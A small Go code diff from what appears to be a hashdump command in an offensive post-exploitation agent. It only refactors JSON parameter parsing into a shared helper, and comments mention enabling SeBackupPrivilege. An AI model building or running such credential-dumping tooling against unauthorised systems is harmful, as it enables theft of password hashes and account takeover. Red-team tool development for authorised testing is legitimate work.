@@ -5,7 +5,6 @@ package commands
 
 import (
 	"encoding/hex"
-	"encoding/json"
 	"fmt"
 	"strings"
 	"time"
@@ -64,11 +63,9 @@ func (c *HashdumpCommand) executeInner(task structs.Task) structs.CommandResult 
 	// SeBackupPrivilege on all threads, and LockOSThread was causing process
 	// crashes during response delivery after hashdump completed.
 
-	var args hashdumpArgs
-	if task.Params != "" {
-		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return errorf("Failed to parse parameters: %v", err)
-		}
+	args, parseErr := unmarshalParams[hashdumpArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	// Enable SeBackupPrivilege on both process and thread tokens
